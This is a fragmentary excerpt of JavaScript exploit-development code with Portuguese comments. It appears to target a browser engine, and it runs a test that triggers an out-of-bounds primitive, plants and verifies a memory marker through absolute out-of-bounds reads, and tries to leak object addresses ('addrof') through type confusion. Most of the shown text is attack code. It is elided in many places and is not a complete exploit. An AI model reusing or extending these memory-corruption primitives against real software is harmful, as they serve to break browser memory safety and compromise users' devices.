...
const OOB_WRITE_VALUES_V82 = [0xABABABAB]; // Valor definido para teste
...
function advInt64LessThanOrEqual(a, b) {
    if (!isAdvancedInt64Object(a) || !isAdvancedInt64Object(b)) {
        logS3(`[advInt64LessThanOrEqual] Comparação inválida: a ou b não é AdvancedInt64 válido. A: ${typeof a}, B: ${typeof b}`, 'error');
        return false; 
    }
...
export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R42() { 
    ...
    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        const current_oob_hex = toHex(current_oob_value || 0); // Garante que toHex recebe um número
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_OOB${current_oob_hex}`;
        logS3(`\n===== ITERATION R42: OOB Write Value: ${current_oob_hex} =====`, "subtest", FNAME_CURRENT_ITERATION);
        ...
        const current_object_to_leak_A = { marker_A_R42: `LeakA_OOB_Val${current_oob_hex}`,r:Math.random() };
        const current_object_to_leak_B = { marker_B_R42: `LeakB_OOB_Val${current_oob_hex}`,r:Math.random() };
        ...
        try { 
            ...
            if (heisenbugConfirmedThisIter) { 
                try {
                    // <<<< R42: Verifica OOB antes de plantar marcador >>>>
                    logS3(`  MemScan: Verificando ambiente OOB antes de plantar marcador...`, 'debug');
                    await triggerOOB_primitive({ force_reinit: false, caller_fname: `${FNAME_CURRENT_ITERATION}-PreScanCheck` }); 
                    if (!isOOBReady(`${FNAME_CURRENT_ITERATION}-PreScanCheck`)) {
                        throw new Error("Ambiente OOB não pronto antes de plantar marcador para Memory Scan.");
                    }
                    ...
                    // <<<< R42: Verifica marcador e robustez de oob_read_absolute >>>>
                    let verify_marker;
                    try {
                        verify_marker = oob_read_absolute(SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R42, 8);
                    } catch (e_verify_read) {
                         throw new Error(`Falha ao LER o marcador plantado: ${e_verify_read.message}`);
                    }
                    if (!isAdvancedInt64Object(verify_marker) || !verify_marker.equals(SCAN_MARKER_VALUE_R42)) {
                        throw new Error(`Falha ao VERIFICAR o marcador. Lido: ${isAdvancedInt64Object(verify_marker) ? verify_marker.toString(true) : String(verify_marker)}`);
                    }
        ...
        let current_iter_summary = { 
            oob_value:toHex(current_oob_value || 0), 
        ...
        if (scan_successful_this_iter) {
            // Se o scan foi bem-sucedido, esta é a melhor iteração até agora
            best_result_for_runner = { ...current_iter_summary };
        } else if (tc_ok_this_iter) {
            // Se o scan não foi bem-sucedido, mas a TC foi, e o melhor resultado atual não teve scan bem-sucedido
            if (!best_result_for_runner.memory_scan_result?.success) {
                 best_result_for_runner = { ...current_iter_summary };
            }
        } else if (!best_result_for_runner.oob_value_used) { 
            // Se esta é a primeira iteração e nada de "bom" aconteceu, ainda assim preenche como "melhor até agora"
             best_result_for_runner = { ...current_iter_summary };
        }
